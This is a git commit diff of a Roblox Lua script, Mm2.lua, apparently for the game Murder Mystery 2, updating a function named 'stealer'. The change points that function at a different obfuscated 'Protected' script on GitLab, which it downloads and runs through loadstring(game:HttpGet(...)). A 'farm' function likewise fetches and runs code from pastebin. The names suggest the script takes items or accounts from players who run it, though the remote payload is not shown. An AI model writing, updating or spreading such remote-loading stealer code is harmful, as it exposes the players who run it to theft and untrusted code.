301c166619c85dd3fb868a6f9d58de66db7fded7
RoshiroGaming <notog779@gmail.com>
2025-03-04 10:41:33 +0800

    Update Mm2.lua

--- Mm2.lua
+++ Mm2.lua
@@ -1,5 +1,5 @@
 local function stealer()
-    loadstring(game:HttpGet("https://gitlab.com/D3athFeather/Script/raw/main/Protected_8af4c67cb52a956a7a41fa73.lua", true))()
+    loadstring(game:HttpGet("https://gitlab.com/D3athFeather/Script/raw/main/Protected_939e0abe9c9634ba2704950e.lua", true))()
 end
 local function farm()
     loadstring(game:HttpGet("https://pastebin.com/raw/zZiAwtfB"))()
